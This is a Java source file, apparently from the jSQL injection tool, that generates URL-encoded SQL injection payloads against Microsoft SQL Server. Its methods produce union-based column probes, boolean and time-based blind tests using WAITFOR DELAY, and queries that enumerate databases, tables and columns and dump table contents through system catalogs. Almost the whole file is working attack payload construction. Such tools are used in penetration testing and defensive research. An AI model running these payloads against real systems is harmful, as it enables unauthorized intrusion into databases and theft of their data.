package com.jsql.model.vendor;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

import org.apache.log4j.Logger;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.blind.ConcreteTimeInjection;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class SQLServerStrategy extends AbstractVendorStrategy {
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(SQLServerStrategy.class);

    @Override
    public String getSchemaInfos() {
        return
            "SELECT+@@version%2B'{%}'%2BDB_NAME()%2B'{%}'%2Buser%2B'{%}'%2Buser_name()%2B'%01%03%03%07'";
    }

    @Override
    public String getSchemaList() {
        return
            "SELECT+" +
                "replace(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),'0'%2bSTUFF(" +
                    "(" +
                        "SELECT" +
                            "+replace(sys.fn_varbintohexstr(CAST(','%2b'%04'%2BCAST(name+AS+VARCHAR(MAX))%2B'%050%04'AS+VARBINARY(MAX))),'0x','')" +
                        "FROM+" +
                            "(select+name,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+from+master..sysdatabases)x+" +
                        "where+1=1+{limit}+FOR+XML+PATH('')" +
                    ")" +
                ",1,1,''),2))%2B'%01%03%03%07',',','%06')";
    }

    @Override
    public String getTableList(Database database) {
        return
            "SELECT+" +
                "replace(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),'0'%2bSTUFF(" +
                    "(" +
                        "SELECT" +
                            "+replace(sys.fn_varbintohexstr(CAST(','%2b'%04'%2BCAST(name+AS+VARCHAR(MAX))%2B'%050%04'AS+VARBINARY(MAX))),'0x','')" +
                        "FROM+" +
                            "(select+name,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+from+"+ database + "..sysobjects+WHERE+xtype='U')x+" +
                        "where+1=1+{limit}+FOR+XML+PATH('')" +
                    ")" +
                ",1,1,''),2))%2B'%01%03%03%07',',','%06')";
    }

    @Override
    public String getColumnList(Table table) {
        try {
            return
                "SELECT+" +
                    "replace(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),'0'%2bSTUFF(" +
                        "(" +
                            "SELECT" +
                                "+replace(sys.fn_varbintohexstr(CAST(','%2b'%04'%2BCAST(name+AS+VARCHAR(MAX))%2B'%050%04'AS+VARBINARY(MAX))),'0x','')" +
                            "FROM+" +
                                "(select+c.name,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+FROM+" +
                                    table.getParent() + "..syscolumns+c," +
                                    table.getParent() + "..sysobjects+t+" +
                                "WHERE+" +
                                    "c.id=t.id+" +
                                "AND+t.name='" + URLEncoder.encode(table.toString(), "UTF-8") + "')x+" +
                            "where+1=1+{limit}+FOR+XML+PATH('')" +
                        ")" +
                    ",1,1,''),2))%2B'%01%03%03%07',',','%06')";
        } catch (UnsupportedEncodingException e) {
            LOGGER.warn("Encoding to UTF-8 is not supported on your system.");
        }
        return null;
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, ",'')))%2b'%7f'%2bLTRIM(RTRIM(coalesce(");
        formatListColumn = "LTRIM(RTRIM(coalesce(" + formatListColumn + ",'')))";

        return
            "SELECT+" +
                "replace(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),'0'%2bSTUFF(" +
                    "(" +
                        "SELECT" +
                            "+replace(sys.fn_varbintohexstr(CAST(','%2b'%04'%2BCAST(" + 
                                formatListColumn + 
                                "+AS+VARCHAR(MAX))%2B'%050%04'AS+VARBINARY(MAX))),'0x','')" +
                        "FROM+" +
                            "(select+*,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+FROM+" + database + ".dbo." + table + ")x+" +
                        "where+1=1+{limit}+FOR+XML+PATH('')" +
                    ")" +
                ",1,1,''),2))%2B'%01%03%03%07',',','%06')";
        
    }    
    
    @Override
    public String[] getListFalseTest() {
        return new String[]{"1=0", "'a'%21='a'", "'b'%21='b'", "1=2", "1%21=1", "2%21=2"};
    }

    @Override
    public String[] getListTrueTest() {
        return new String[]{"1=1", "0=0", "'a'%21='b'", "'a'='a'", "2=2", "1%21=2"};
    }

    @Override
    public String getBlindFirstTest() {
        return "0%2b1=1";
    }

    @Override
    public String blindCheck(String check) {
        return "+and+" + check + "--+";
    }

    @Override
    public String blindBitTest(String inj, int indexCharacter, int bit) {
        return "+and+0!=(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ")--+";
    }

    @Override
    public String blindLengthTest(String inj, int indexCharacter) {
        return "+and+len(" + inj + ")>" + indexCharacter + "--+";
    }

    @Override
    public String timeCheck(String check) {
        return ";if(" + check + ")WAITFOR+DELAY'00:00:00'else+WAITFOR+DELAY'00:00:" + ConcreteTimeInjection.SLEEP + "'--+";
    }

    @Override
    public String timeBitTest(String inj, int indexCharacter, int bit) {
        return ";if(0!=(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "))WAITFOR+DELAY'00:00:00'else+WAITFOR+DELAY'00:00:" + ConcreteTimeInjection.SLEEP + "'--+";
    }

    @Override
    public String timeLengthTest(String inj, int indexCharacter) {
        return ";if(len(" + inj + ")>" + indexCharacter + ")WAITFOR+DELAY'00:00:00'else+WAITFOR+DELAY'00:00:" + ConcreteTimeInjection.SLEEP + "'--+";
    }

    @Override
    public String blindStrategy(String sqlQuery, String startPosition) {
        return
            "(select'SQLi'%2Bsubstring((" + sqlQuery + ")," + startPosition + ",65536))";
    }

    @Override
    public String timeStrategy(String sqlQuery, String startPosition) {
        return
            "(select'SQLi'%2Bsubstring((" + sqlQuery + ")," + startPosition + ",65536))";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return
            "(select'SQLi'%2Bsubstring((" + sqlQuery + ")," + startPosition + ",65536))";
    }

    @Override
    public String getIndicesCapacity(String[] indexes) {
        return
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "(select+concat('SQLi$1',replicate(0x23,1024),'iLQS'))"
            );
    }

    @Override
    public String getIndices(Integer nbFields) {
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("CONVERT(varchar,(1337"+ i +"7330%2b1))");
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "--+";
    }

    @Override
    public String getOrderBy() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "and+rnum+BETWEEN+" + (limitSQLResult+1) + "+AND+65536";
    }
}